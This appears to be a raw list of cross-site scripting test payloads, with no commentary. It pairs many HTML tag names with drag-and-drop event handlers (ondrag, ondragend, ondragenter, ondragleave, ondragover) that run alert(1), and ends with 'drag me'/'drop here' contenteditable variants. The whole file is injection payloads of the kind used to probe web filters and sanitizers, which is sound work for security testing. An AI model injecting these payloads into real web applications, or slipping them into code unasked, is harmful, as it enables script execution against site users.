<section draggable="true" ondrag="alert(1)">test</section>
<select draggable="true" ondrag="alert(1)">test</select>
<shadow draggable="true" ondrag="alert(1)">test</shadow>
<slot draggable="true" ondrag="alert(1)">test</slot>
<small draggable="true" ondrag="alert(1)">test</small>
<source draggable="true" ondrag="alert(1)">test</source>
<spacer draggable="true" ondrag="alert(1)">test</spacer>
<span draggable="true" ondrag="alert(1)">test</span>
<strike draggable="true" ondrag="alert(1)">test</strike>
<strong draggable="true" ondrag="alert(1)">test</strong>
<style draggable="true" ondrag="alert(1)">test</style>
<sub draggable="true" ondrag="alert(1)">test</sub>
<summary draggable="true" ondrag="alert(1)">test</summary>
<sup draggable="true" ondrag="alert(1)">test</sup>
<svg draggable="true" ondrag="alert(1)">test</svg>
<table draggable="true" ondrag="alert(1)">test</table>
<tbody draggable="true" ondrag="alert(1)">test</tbody>
<td draggable="true" ondrag="alert(1)">test</td>
<template draggable="true" ondrag="alert(1)">test</template>
<textarea draggable="true" ondrag="alert(1)">test</textarea>
<tfoot draggable="true" ondrag="alert(1)">test</tfoot>
<th draggable="true" ondrag="alert(1)">test</th>
<thead draggable="true" ondrag="alert(1)">test</thead>
<time draggable="true" ondrag="alert(1)">test</time>
<title draggable="true" ondrag="alert(1)">test</title>
<tr draggable="true" ondrag="alert(1)">test</tr>
<track draggable="true" ondrag="alert(1)">test</track>
<tt draggable="true" ondrag="alert(1)">test</tt>
<u draggable="true" ondrag="alert(1)">test</u>
<ul draggable="true" ondrag="alert(1)">test</ul>
<var draggable="true" ondrag="alert(1)">test</var>
<video draggable="true" ondrag="alert(1)">test</video>
<wbr draggable="true" ondrag="alert(1)">test</wbr>
<xmp draggable="true" ondrag="alert(1)">test</xmp>
<a draggable="true" ondragend="alert(1)">test</a>
<abbr draggable="true" ondragend="alert(1)">test</abbr>
<acronym draggable="true" ondragend="alert(1)">test</acronym>
<address draggable="true" ondragend="alert(1)">test</address>
<applet draggable="true" ondragend="alert(1)">test</applet>
<area draggable="true" ondragend="alert(1)">test</area>
<article draggable="true" ondragend="alert(1)">test</article>
<aside draggable="true" ondragend="alert(1)">test</aside>
<audio draggable="true" ondragend="alert(1)">test</audio>
<b draggable="true" ondragend="alert(1)">test</b>
<base draggable="true" ondragend="alert(1)">test</base>
<basefont draggable="true" ondragend="alert(1)">test</basefont>
<bdi draggable="true" ondragend="alert(1)">test</bdi>
<bdo draggable="true" ondragend="alert(1)">test</bdo>
<bgsound draggable="true" ondragend="alert(1)">test</bgsound>
<big draggable="true" ondragend="alert(1)">test</big>
<blink draggable="true" ondragend="alert(1)">test</blink>
<blockquote draggable="true" ondragend="alert(1)">test</blockquote>
<body draggable="true" ondragend="alert(1)">test</body>
<br draggable="true" ondragend="alert(1)">test</br>
<button draggable="true" ondragend="alert(1)">test</button>
<canvas draggable="true" ondragend="alert(1)">test</canvas>
<caption draggable="true" ondragend="alert(1)">test</caption>
<center draggable="true" ondragend="alert(1)">test</center>
<cite draggable="true" ondragend="alert(1)">test</cite>
<code draggable="true" ondragend="alert(1)">test</code>
<col draggable="true" ondragend="alert(1)">test</col>
<colgroup draggable="true" ondragend="alert(1)">test</colgroup>
<command draggable="true" ondragend="alert(1)">test</command>
<content draggable="true" ondragend="alert(1)">test</content>
<data draggable="true" ondragend="alert(1)">test</data>
<datalist draggable="true" ondragend="alert(1)">test</datalist>
<dd draggable="true" ondragend="alert(1)">test</dd>
<del draggable="true" ondragend="alert(1)">test</del>
<details draggable="true" ondragend="alert(1)">test</details>
<dfn draggable="true" ondragend="alert(1)">test</dfn>
<dialog draggable="true" ondragend="alert(1)">test</dialog>
<dir draggable="true" ondragend="alert(1)">test</dir>
<div draggable="true" ondragend="alert(1)">test</div>
<dl draggable="true" ondragend="alert(1)">test</dl>
<dt draggable="true" ondragend="alert(1)">test</dt>
<element draggable="true" ondragend="alert(1)">test</element>
<em draggable="true" ondragend="alert(1)">test</em>
<embed draggable="true" ondragend="alert(1)">test</embed>
<fieldset draggable="true" ondragend="alert(1)">test</fieldset>
<figcaption draggable="true" ondragend="alert(1)">test</figcaption>
<figure draggable="true" ondragend="alert(1)">test</figure>
<font draggable="true" ondragend="alert(1)">test</font>
<footer draggable="true" ondragend="alert(1)">test</footer>
<form draggable="true" ondragend="alert(1)">test</form>
<frame draggable="true" ondragend="alert(1)">test</frame>
<frameset draggable="true" ondragend="alert(1)">test</frameset>
<h1 draggable="true" ondragend="alert(1)">test</h1>
<head draggable="true" ondragend="alert(1)">test</head>
<header draggable="true" ondragend="alert(1)">test</header>
<hgroup draggable="true" ondragend="alert(1)">test</hgroup>
<hr draggable="true" ondragend="alert(1)">test</hr>
<html draggable="true" ondragend="alert(1)">test</html>
<i draggable="true" ondragend="alert(1)">test</i>
<iframe draggable="true" ondragend="alert(1)">test</iframe>
<image draggable="true" ondragend="alert(1)">test</image>
<img draggable="true" ondragend="alert(1)">test</img>
<input draggable="true" ondragend="alert(1)">test</input>
<ins draggable="true" ondragend="alert(1)">test</ins>
<isindex draggable="true" ondragend="alert(1)">test</isindex>
<kbd draggable="true" ondragend="alert(1)">test</kbd>
<keygen draggable="true" ondragend="alert(1)">test</keygen>
<label draggable="true" ondragend="alert(1)">test</label>
<legend draggable="true" ondragend="alert(1)">test</legend>
<li draggable="true" ondragend="alert(1)">test</li>
<link draggable="true" ondragend="alert(1)">test</link>
<listing draggable="true" ondragend="alert(1)">test</listing>
<main draggable="true" ondragend="alert(1)">test</main>
<map draggable="true" ondragend="alert(1)">test</map>
<mark draggable="true" ondragend="alert(1)">test</mark>
<marquee draggable="true" ondragend="alert(1)">test</marquee>
<menu draggable="true" ondragend="alert(1)">test</menu>
<menuitem draggable="true" ondragend="alert(1)">test</menuitem>
<meta draggable="true" ondragend="alert(1)">test</meta>
<meter draggable="true" ondragend="alert(1)">test</meter>
<multicol draggable="true" ondragend="alert(1)">test</multicol>
<nav draggable="true" ondragend="alert(1)">test</nav>
<nextid draggable="true" ondragend="alert(1)">test</nextid>
<nobr draggable="true" ondragend="alert(1)">test</nobr>
<noembed draggable="true" ondragend="alert(1)">test</noembed>
<noframes draggable="true" ondragend="alert(1)">test</noframes>
<noscript draggable="true" ondragend="alert(1)">test</noscript>
<object draggable="true" ondragend="alert(1)">test</object>
<ol draggable="true" ondragend="alert(1)">test</ol>
<optgroup draggable="true" ondragend="alert(1)">test</optgroup>
<option draggable="true" ondragend="alert(1)">test</option>
<output draggable="true" ondragend="alert(1)">test</output>
<p draggable="true" ondragend="alert(1)">test</p>
<param draggable="true" ondragend="alert(1)">test</param>
<picture draggable="true" ondragend="alert(1)">test</picture>
<plaintext draggable="true" ondragend="alert(1)">test</plaintext>
<pre draggable="true" ondragend="alert(1)">test</pre>
<progress draggable="true" ondragend="alert(1)">test</progress>
<q draggable="true" ondragend="alert(1)">test</q>
<rb draggable="true" ondragend="alert(1)">test</rb>
<rp draggable="true" ondragend="alert(1)">test</rp>
<rt draggable="true" ondragend="alert(1)">test</rt>
<rtc draggable="true" ondragend="alert(1)">test</rtc>
<ruby draggable="true" ondragend="alert(1)">test</ruby>
<s draggable="true" ondragend="alert(1)">test</s>
<samp draggable="true" ondragend="alert(1)">test</samp>
<script draggable="true" ondragend="alert(1)">test</script>
<section draggable="true" ondragend="alert(1)">test</section>
<select draggable="true" ondragend="alert(1)">test</select>
<shadow draggable="true" ondragend="alert(1)">test</shadow>
<slot draggable="true" ondragend="alert(1)">test</slot>
<small draggable="true" ondragend="alert(1)">test</small>
<source draggable="true" ondragend="alert(1)">test</source>
<spacer draggable="true" ondragend="alert(1)">test</spacer>
<span draggable="true" ondragend="alert(1)">test</span>
<strike draggable="true" ondragend="alert(1)">test</strike>
<strong draggable="true" ondragend="alert(1)">test</strong>
<style draggable="true" ondragend="alert(1)">test</style>
<sub draggable="true" ondragend="alert(1)">test</sub>
<summary draggable="true" ondragend="alert(1)">test</summary>
<sup draggable="true" ondragend="alert(1)">test</sup>
<svg draggable="true" ondragend="alert(1)">test</svg>
<table draggable="true" ondragend="alert(1)">test</table>
<tbody draggable="true" ondragend="alert(1)">test</tbody>
<td draggable="true" ondragend="alert(1)">test</td>
<template draggable="true" ondragend="alert(1)">test</template>
<textarea draggable="true" ondragend="alert(1)">test</textarea>
<tfoot draggable="true" ondragend="alert(1)">test</tfoot>
<th draggable="true" ondragend="alert(1)">test</th>
<thead draggable="true" ondragend="alert(1)">test</thead>
<time draggable="true" ondragend="alert(1)">test</time>
<title draggable="true" ondragend="alert(1)">test</title>
<tr draggable="true" ondragend="alert(1)">test</tr>
<track draggable="true" ondragend="alert(1)">test</track>
<tt draggable="true" ondragend="alert(1)">test</tt>
<u draggable="true" ondragend="alert(1)">test</u>
<ul draggable="true" ondragend="alert(1)">test</ul>
<var draggable="true" ondragend="alert(1)">test</var>
<video draggable="true" ondragend="alert(1)">test</video>
<wbr draggable="true" ondragend="alert(1)">test</wbr>
<xmp draggable="true" ondragend="alert(1)">test</xmp>
<a draggable="true" ondragenter="alert(1)">test</a>
<abbr draggable="true" ondragenter="alert(1)">test</abbr>
<acronym draggable="true" ondragenter="alert(1)">test</acronym>
<address draggable="true" ondragenter="alert(1)">test</address>
<applet draggable="true" ondragenter="alert(1)">test</applet>
<area draggable="true" ondragenter="alert(1)">test</area>
<article draggable="true" ondragenter="alert(1)">test</article>
<aside draggable="true" ondragenter="alert(1)">test</aside>
<audio draggable="true" ondragenter="alert(1)">test</audio>
<b draggable="true" ondragenter="alert(1)">test</b>
<base draggable="true" ondragenter="alert(1)">test</base>
<basefont draggable="true" ondragenter="alert(1)">test</basefont>
<bdi draggable="true" ondragenter="alert(1)">test</bdi>
<bdo draggable="true" ondragenter="alert(1)">test</bdo>
<bgsound draggable="true" ondragenter="alert(1)">test</bgsound>
<big draggable="true" ondragenter="alert(1)">test</big>
<blink draggable="true" ondragenter="alert(1)">test</blink>
<blockquote draggable="true" ondragenter="alert(1)">test</blockquote>
<body draggable="true" ondragenter="alert(1)">test</body>
<br draggable="true" ondragenter="alert(1)">test</br>
<button draggable="true" ondragenter="alert(1)">test</button>
<canvas draggable="true" ondragenter="alert(1)">test</canvas>
<caption draggable="true" ondragenter="alert(1)">test</caption>
<center draggable="true" ondragenter="alert(1)">test</center>
<cite draggable="true" ondragenter="alert(1)">test</cite>
<code draggable="true" ondragenter="alert(1)">test</code>
<col draggable="true" ondragenter="alert(1)">test</col>
<colgroup draggable="true" ondragenter="alert(1)">test</colgroup>
<command draggable="true" ondragenter="alert(1)">test</command>
<content draggable="true" ondragenter="alert(1)">test</content>
<data draggable="true" ondragenter="alert(1)">test</data>
<datalist draggable="true" ondragenter="alert(1)">test</datalist>
<dd draggable="true" ondragenter="alert(1)">test</dd>
<del draggable="true" ondragenter="alert(1)">test</del>
<details draggable="true" ondragenter="alert(1)">test</details>
<dfn draggable="true" ondragenter="alert(1)">test</dfn>
<dialog draggable="true" ondragenter="alert(1)">test</dialog>
<dir draggable="true" ondragenter="alert(1)">test</dir>
<div draggable="true" ondragenter="alert(1)">test</div>
<dl draggable="true" ondragenter="alert(1)">test</dl>
<dt draggable="true" ondragenter="alert(1)">test</dt>
<element draggable="true" ondragenter="alert(1)">test</element>
<em draggable="true" ondragenter="alert(1)">test</em>
<embed draggable="true" ondragenter="alert(1)">test</embed>
<fieldset draggable="true" ondragenter="alert(1)">test</fieldset>
<figcaption draggable="true" ondragenter="alert(1)">test</figcaption>
<figure draggable="true" ondragenter="alert(1)">test</figure>
<font draggable="true" ondragenter="alert(1)">test</font>
<footer draggable="true" ondragenter="alert(1)">test</footer>
<form draggable="true" ondragenter="alert(1)">test</form>
<frame draggable="true" ondragenter="alert(1)">test</frame>
<frameset draggable="true" ondragenter="alert(1)">test</frameset>
<h1 draggable="true" ondragenter="alert(1)">test</h1>
<head draggable="true" ondragenter="alert(1)">test</head>
<header draggable="true" ondragenter="alert(1)">test</header>
<hgroup draggable="true" ondragenter="alert(1)">test</hgroup>
<hr draggable="true" ondragenter="alert(1)">test</hr>
<html draggable="true" ondragenter="alert(1)">test</html>
<i draggable="true" ondragenter="alert(1)">test</i>
<iframe draggable="true" ondragenter="alert(1)">test</iframe>
<image draggable="true" ondragenter="alert(1)">test</image>
<img draggable="true" ondragenter="alert(1)">test</img>
<input draggable="true" ondragenter="alert(1)">test</input>
<ins draggable="true" ondragenter="alert(1)">test</ins>
<isindex draggable="true" ondragenter="alert(1)">test</isindex>
<kbd draggable="true" ondragenter="alert(1)">test</kbd>
<keygen draggable="true" ondragenter="alert(1)">test</keygen>
<label draggable="true" ondragenter="alert(1)">test</label>
<legend draggable="true" ondragenter="alert(1)">test</legend>
<li draggable="true" ondragenter="alert(1)">test</li>
<link draggable="true" ondragenter="alert(1)">test</link>
<listing draggable="true" ondragenter="alert(1)">test</listing>
<main draggable="true" ondragenter="alert(1)">test</main>
<map draggable="true" ondragenter="alert(1)">test</map>
<mark draggable="true" ondragenter="alert(1)">test</mark>
<marquee draggable="true" ondragenter="alert(1)">test</marquee>
<menu draggable="true" ondragenter="alert(1)">test</menu>
<menuitem draggable="true" ondragenter="alert(1)">test</menuitem>
<meta draggable="true" ondragenter="alert(1)">test</meta>
<meter draggable="true" ondragenter="alert(1)">test</meter>
<multicol draggable="true" ondragenter="alert(1)">test</multicol>
<nav draggable="true" ondragenter="alert(1)">test</nav>
<nextid draggable="true" ondragenter="alert(1)">test</nextid>
<nobr draggable="true" ondragenter="alert(1)">test</nobr>
<noembed draggable="true" ondragenter="alert(1)">test</noembed>
<noframes draggable="true" ondragenter="alert(1)">test</noframes>
<noscript draggable="true" ondragenter="alert(1)">test</noscript>
<object draggable="true" ondragenter="alert(1)">test</object>
<ol draggable="true" ondragenter="alert(1)">test</ol>
<optgroup draggable="true" ondragenter="alert(1)">test</optgroup>
<option draggable="true" ondragenter="alert(1)">test</option>
<output draggable="true" ondragenter="alert(1)">test</output>
<p draggable="true" ondragenter="alert(1)">test</p>
<param draggable="true" ondragenter="alert(1)">test</param>
<picture draggable="true" ondragenter="alert(1)">test</picture>
<plaintext draggable="true" ondragenter="alert(1)">test</plaintext>
<pre draggable="true" ondragenter="alert(1)">test</pre>
<progress draggable="true" ondragenter="alert(1)">test</progress>
<q draggable="true" ondragenter="alert(1)">test</q>
<rb draggable="true" ondragenter="alert(1)">test</rb>
<rp draggable="true" ondragenter="alert(1)">test</rp>
<rt draggable="true" ondragenter="alert(1)">test</rt>
<rtc draggable="true" ondragenter="alert(1)">test</rtc>
<ruby draggable="true" ondragenter="alert(1)">test</ruby>
<s draggable="true" ondragenter="alert(1)">test</s>
<samp draggable="true" ondragenter="alert(1)">test</samp>
<script draggable="true" ondragenter="alert(1)">test</script>
<section draggable="true" ondragenter="alert(1)">test</section>
<select draggable="true" ondragenter="alert(1)">test</select>
<shadow draggable="true" ondragenter="alert(1)">test</shadow>
<slot draggable="true" ondragenter="alert(1)">test</slot>
<small draggable="true" ondragenter="alert(1)">test</small>
<source draggable="true" ondragenter="alert(1)">test</source>
<spacer draggable="true" ondragenter="alert(1)">test</spacer>
<span draggable="true" ondragenter="alert(1)">test</span>
<strike draggable="true" ondragenter="alert(1)">test</strike>
<strong draggable="true" ondragenter="alert(1)">test</strong>
<style draggable="true" ondragenter="alert(1)">test</style>
<sub draggable="true" ondragenter="alert(1)">test</sub>
<summary draggable="true" ondragenter="alert(1)">test</summary>
<sup draggable="true" ondragenter="alert(1)">test</sup>
<svg draggable="true" ondragenter="alert(1)">test</svg>
<table draggable="true" ondragenter="alert(1)">test</table>
<tbody draggable="true" ondragenter="alert(1)">test</tbody>
<td draggable="true" ondragenter="alert(1)">test</td>
<template draggable="true" ondragenter="alert(1)">test</template>
<textarea draggable="true" ondragenter="alert(1)">test</textarea>
<tfoot draggable="true" ondragenter="alert(1)">test</tfoot>
<th draggable="true" ondragenter="alert(1)">test</th>
<thead draggable="true" ondragenter="alert(1)">test</thead>
<time draggable="true" ondragenter="alert(1)">test</time>
<title draggable="true" ondragenter="alert(1)">test</title>
<tr draggable="true" ondragenter="alert(1)">test</tr>
<track draggable="true" ondragenter="alert(1)">test</track>
<tt draggable="true" ondragenter="alert(1)">test</tt>
<u draggable="true" ondragenter="alert(1)">test</u>
<ul draggable="true" ondragenter="alert(1)">test</ul>
<var draggable="true" ondragenter="alert(1)">test</var>
<video draggable="true" ondragenter="alert(1)">test</video>
<wbr draggable="true" ondragenter="alert(1)">test</wbr>
<xmp draggable="true" ondragenter="alert(1)">test</xmp>
<a draggable="true" ondragleave="alert(1)">test</a>
<abbr draggable="true" ondragleave="alert(1)">test</abbr>
<acronym draggable="true" ondragleave="alert(1)">test</acronym>
<address draggable="true" ondragleave="alert(1)">test</address>
<applet draggable="true" ondragleave="alert(1)">test</applet>
<area draggable="true" ondragleave="alert(1)">test</area>
<article draggable="true" ondragleave="alert(1)">test</article>
<aside draggable="true" ondragleave="alert(1)">test</aside>
<audio draggable="true" ondragleave="alert(1)">test</audio>
<b draggable="true" ondragleave="alert(1)">test</b>
<base draggable="true" ondragleave="alert(1)">test</base>
<basefont draggable="true" ondragleave="alert(1)">test</basefont>
<bdi draggable="true" ondragleave="alert(1)">test</bdi>
<bdo draggable="true" ondragleave="alert(1)">test</bdo>
<bgsound draggable="true" ondragleave="alert(1)">test</bgsound>
<big draggable="true" ondragleave="alert(1)">test</big>
<blink draggable="true" ondragleave="alert(1)">test</blink>
<blockquote draggable="true" ondragleave="alert(1)">test</blockquote>
<body draggable="true" ondragleave="alert(1)">test</body>
<br draggable="true" ondragleave="alert(1)">test</br>
<button draggable="true" ondragleave="alert(1)">test</button>
<canvas draggable="true" ondragleave="alert(1)">test</canvas>
<caption draggable="true" ondragleave="alert(1)">test</caption>
<center draggable="true" ondragleave="alert(1)">test</center>
<cite draggable="true" ondragleave="alert(1)">test</cite>
<code draggable="true" ondragleave="alert(1)">test</code>
<col draggable="true" ondragleave="alert(1)">test</col>
<colgroup draggable="true" ondragleave="alert(1)">test</colgroup>
<command draggable="true" ondragleave="alert(1)">test</command>
<content draggable="true" ondragleave="alert(1)">test</content>
<data draggable="true" ondragleave="alert(1)">test</data>
<datalist draggable="true" ondragleave="alert(1)">test</datalist>
<dd draggable="true" ondragleave="alert(1)">test</dd>
<del draggable="true" ondragleave="alert(1)">test</del>
<details draggable="true" ondragleave="alert(1)">test</details>
<dfn draggable="true" ondragleave="alert(1)">test</dfn>
<dialog draggable="true" ondragleave="alert(1)">test</dialog>
<dir draggable="true" ondragleave="alert(1)">test</dir>
<div draggable="true" ondragleave="alert(1)">test</div>
<dl draggable="true" ondragleave="alert(1)">test</dl>
<dt draggable="true" ondragleave="alert(1)">test</dt>
<element draggable="true" ondragleave="alert(1)">test</element>
<em draggable="true" ondragleave="alert(1)">test</em>
<embed draggable="true" ondragleave="alert(1)">test</embed>
<fieldset draggable="true" ondragleave="alert(1)">test</fieldset>
<figcaption draggable="true" ondragleave="alert(1)">test</figcaption>
<figure draggable="true" ondragleave="alert(1)">test</figure>
<font draggable="true" ondragleave="alert(1)">test</font>
<footer draggable="true" ondragleave="alert(1)">test</footer>
<form draggable="true" ondragleave="alert(1)">test</form>
<frame draggable="true" ondragleave="alert(1)">test</frame>
<frameset draggable="true" ondragleave="alert(1)">test</frameset>
<h1 draggable="true" ondragleave="alert(1)">test</h1>
<head draggable="true" ondragleave="alert(1)">test</head>
<header draggable="true" ondragleave="alert(1)">test</header>
<hgroup draggable="true" ondragleave="alert(1)">test</hgroup>
<hr draggable="true" ondragleave="alert(1)">test</hr>
<html draggable="true" ondragleave="alert(1)">test</html>
<i draggable="true" ondragleave="alert(1)">test</i>
<iframe draggable="true" ondragleave="alert(1)">test</iframe>
<image draggable="true" ondragleave="alert(1)">test</image>
<img draggable="true" ondragleave="alert(1)">test</img>
<input draggable="true" ondragleave="alert(1)">test</input>
<ins draggable="true" ondragleave="alert(1)">test</ins>
<isindex draggable="true" ondragleave="alert(1)">test</isindex>
<kbd draggable="true" ondragleave="alert(1)">test</kbd>
<keygen draggable="true" ondragleave="alert(1)">test</keygen>
<label draggable="true" ondragleave="alert(1)">test</label>
<legend draggable="true" ondragleave="alert(1)">test</legend>
<li draggable="true" ondragleave="alert(1)">test</li>
<link draggable="true" ondragleave="alert(1)">test</link>
<listing draggable="true" ondragleave="alert(1)">test</listing>
<main draggable="true" ondragleave="alert(1)">test</main>
<map draggable="true" ondragleave="alert(1)">test</map>
<mark draggable="true" ondragleave="alert(1)">test</mark>
<marquee draggable="true" ondragleave="alert(1)">test</marquee>
<menu draggable="true" ondragleave="alert(1)">test</menu>
<menuitem draggable="true" ondragleave="alert(1)">test</menuitem>
<meta draggable="true" ondragleave="alert(1)">test</meta>
<meter draggable="true" ondragleave="alert(1)">test</meter>
<multicol draggable="true" ondragleave="alert(1)">test</multicol>
<nav draggable="true" ondragleave="alert(1)">test</nav>
<nextid draggable="true" ondragleave="alert(1)">test</nextid>
<nobr draggable="true" ondragleave="alert(1)">test</nobr>
<noembed draggable="true" ondragleave="alert(1)">test</noembed>
<noframes draggable="true" ondragleave="alert(1)">test</noframes>
<noscript draggable="true" ondragleave="alert(1)">test</noscript>
<object draggable="true" ondragleave="alert(1)">test</object>
<ol draggable="true" ondragleave="alert(1)">test</ol>
<optgroup draggable="true" ondragleave="alert(1)">test</optgroup>
<option draggable="true" ondragleave="alert(1)">test</option>
<output draggable="true" ondragleave="alert(1)">test</output>
<p draggable="true" ondragleave="alert(1)">test</p>
<param draggable="true" ondragleave="alert(1)">test</param>
<picture draggable="true" ondragleave="alert(1)">test</picture>
<plaintext draggable="true" ondragleave="alert(1)">test</plaintext>
<pre draggable="true" ondragleave="alert(1)">test</pre>
<progress draggable="true" ondragleave="alert(1)">test</progress>
<q draggable="true" ondragleave="alert(1)">test</q>
<rb draggable="true" ondragleave="alert(1)">test</rb>
<rp draggable="true" ondragleave="alert(1)">test</rp>
<rt draggable="true" ondragleave="alert(1)">test</rt>
<rtc draggable="true" ondragleave="alert(1)">test</rtc>
<ruby draggable="true" ondragleave="alert(1)">test</ruby>
<s draggable="true" ondragleave="alert(1)">test</s>
<samp draggable="true" ondragleave="alert(1)">test</samp>
<script draggable="true" ondragleave="alert(1)">test</script>
<section draggable="true" ondragleave="alert(1)">test</section>
<select draggable="true" ondragleave="alert(1)">test</select>
<shadow draggable="true" ondragleave="alert(1)">test</shadow>
<slot draggable="true" ondragleave="alert(1)">test</slot>
<small draggable="true" ondragleave="alert(1)">test</small>
<source draggable="true" ondragleave="alert(1)">test</source>
<spacer draggable="true" ondragleave="alert(1)">test</spacer>
<span draggable="true" ondragleave="alert(1)">test</span>
<strike draggable="true" ondragleave="alert(1)">test</strike>
<strong draggable="true" ondragleave="alert(1)">test</strong>
<style draggable="true" ondragleave="alert(1)">test</style>
<sub draggable="true" ondragleave="alert(1)">test</sub>
<summary draggable="true" ondragleave="alert(1)">test</summary>
<sup draggable="true" ondragleave="alert(1)">test</sup>
<svg draggable="true" ondragleave="alert(1)">test</svg>
<table draggable="true" ondragleave="alert(1)">test</table>
<tbody draggable="true" ondragleave="alert(1)">test</tbody>
<td draggable="true" ondragleave="alert(1)">test</td>
<template draggable="true" ondragleave="alert(1)">test</template>
<textarea draggable="true" ondragleave="alert(1)">test</textarea>
<tfoot draggable="true" ondragleave="alert(1)">test</tfoot>
<th draggable="true" ondragleave="alert(1)">test</th>
<thead draggable="true" ondragleave="alert(1)">test</thead>
<time draggable="true" ondragleave="alert(1)">test</time>
<title draggable="true" ondragleave="alert(1)">test</title>
<tr draggable="true" ondragleave="alert(1)">test</tr>
<track draggable="true" ondragleave="alert(1)">test</track>
<tt draggable="true" ondragleave="alert(1)">test</tt>
<u draggable="true" ondragleave="alert(1)">test</u>
<ul draggable="true" ondragleave="alert(1)">test</ul>
<var draggable="true" ondragleave="alert(1)">test</var>
<video draggable="true" ondragleave="alert(1)">test</video>
<wbr draggable="true" ondragleave="alert(1)">test</wbr>
<xmp draggable="true" ondragleave="alert(1)">test</xmp>
<div draggable="true" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>
<div draggable="true" contenteditable>drag me</div><abbr ondragover=alert(1) contenteditable>drop here</abbr>
<div draggable="true" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>
<div draggable="true" contenteditable>drag me</div><address ondragover=alert(1) contenteditable>drop here</address>
<div draggable="true" contenteditable>drag me</div><applet ondragover=alert(1) contenteditable>drop here</applet>
<div draggable="true" contenteditable>drag me</div><area ondragover=alert(1) contenteditable>drop here</area>
<div draggable="true" contenteditable>drag me</div><article ondragover=alert(1) contenteditable>drop here</article>
<div draggable="true" contenteditable>drag me</div><aside ondragover=alert(1) contenteditable>drop here</aside>
<div draggable="true" contenteditable>drag me</div><audio ondragover=alert(1) contenteditable>drop here</audio>
<div draggable="true" contenteditable>drag me</div><b ondragover=alert(1) contenteditable>drop here</b>
<div draggable="true" contenteditable>drag me</div><base ondragover=alert(1) contenteditable>drop here</base>
<div draggable="true" contenteditable>drag me</div><basefont ondragover=alert(1) contenteditable>drop here</basefont>
<div draggable="true" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>
<div draggable="true" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>
<div draggable="true" contenteditable>drag me</div><bgsound ondragover=alert(1) contenteditable>drop here</bgsound>
<div draggable="true" contenteditable>drag me</div><big ondragover=alert(1) contenteditable>drop here</big>
<div draggable="true" contenteditable>drag me</div><blink ondragover=alert(1) contenteditable>drop here</blink>
<div draggable="true" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>
<div draggable="true" contenteditable>drag me</div><body ondragover=alert(1) contenteditable>drop here</body>
<div draggable="true" contenteditable>drag me</div><br ondragover=alert(1) contenteditable>drop here</br>
<div draggable="true" contenteditable>drag me</div><button ondragover=alert(1) contenteditable>drop here</button>
<div draggable="true" contenteditable>drag me</div><canvas ondragover=alert(1) contenteditable>drop here</canvas>
<div draggable="true" contenteditable>drag me</div><caption ondragover=alert(1) contenteditable>drop here</caption>
<div draggable="true" contenteditable>drag me</div><center ondragover=alert(1) contenteditable>drop here</center>
<div draggable="true" contenteditable>drag me</div><cite ondragover=alert(1) contenteditable>drop here</cite>
<div draggable="true" contenteditable>drag me</div><code ondragover=alert(1) contenteditable>drop here</code>
<div draggable="true" contenteditable>drag me</div><col ondragover=alert(1) contenteditable>drop here</col>
<div draggable="true" contenteditable>drag me</div><colgroup ondragover=alert(1) contenteditable>drop here</colgroup>
<div draggable="true" contenteditable>drag me</div><command ondragover=alert(1) contenteditable>drop here</command>
<div draggable="true" contenteditable>drag me</div><content ondragover=alert(1) contenteditable>drop here</content>
<div draggable="true" contenteditable>drag me</div><data ondragover=alert(1) contenteditable>drop here</data>
<div draggable="true" contenteditable>drag me</div><datalist ondragover=alert(1) contenteditable>drop here</datalist>
<div draggable="true" contenteditable>drag me</div><dd ondragover=alert(1) contenteditable>drop here</dd>
<div draggable="true" contenteditable>drag me</div><del ondragover=alert(1) contenteditable>drop here</del>
<div draggable="true" contenteditable>drag me</div><details ondragover=alert(1) contenteditable>drop here</details>
<div draggable="true" contenteditable>drag me</div><dfn ondragover=alert(1) contenteditable>drop here</dfn>
<div draggable="true" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>
<div draggable="true" contenteditable>drag me</div><dir ondragover=alert(1) contenteditable>drop here</dir>
<div draggable="true" contenteditable>drag me</div><div ondragover=alert(1) contenteditable>drop here</div>
<div draggable="true" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>
<div draggable="true" contenteditable>drag me</div><dt ondragover=alert(1) contenteditable>drop here</dt>
<div draggable="true" contenteditable>drag me</div><element ondragover=alert(1) contenteditable>drop here</element>
<div draggable="true" contenteditable>drag me</div><em ondragover=alert(1) contenteditable>drop here</em>
<div draggable="true" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable>drop here</embed>
<div draggable="true" contenteditable>drag me</div><fieldset ondragover=alert(1) contenteditable>drop here</fieldset>
<div draggable="true" contenteditable>drag me</div><figcaption ondragover=alert(1) contenteditable>drop here</figcaption>
<div draggable="true" contenteditable>drag me</div><figure ondragover=alert(1) contenteditable>drop here</figure>
<div draggable="true" contenteditable>drag me</div><font ondragover=alert(1) contenteditable>drop here</font>
<div draggable="true" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable>drop here</footer>
<div draggable="true" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>
<div draggable="true" contenteditable>drag me</div><frame ondragover=alert(1) contenteditable>drop here</frame>
<div draggable="true" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable>drop here</frameset>
<div draggable="true" contenteditable>drag me</div><h1 ondragover=alert(1) contenteditable>drop here</h1>
<div draggable="true" contenteditable>drag me</div><head ondragover=alert(1) contenteditable>drop here</head>
<div draggable="true" contenteditable>drag me</div><header ondragover=alert(1) contenteditable>drop here</header>
<div draggable="true" contenteditable>drag me</div><hgroup ondragover=alert(1) contenteditable>drop here</hgroup>
<div draggable="true" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>
<div draggable="true" contenteditable>drag me</div><html ondragover=alert(1) contenteditable>drop here</html>
<div draggable="true" contenteditable>drag me</div><i ondragover=alert(1) contenteditable>drop here</i>
<div draggable="true" contenteditable>drag me</div><iframe ondragover=alert(1) contenteditable>drop here</iframe>
<div draggable="true" contenteditable>drag me</div><image ondragover=alert(1) contenteditable>drop here</image>
<div draggable="true" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>
<div draggable="true" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>
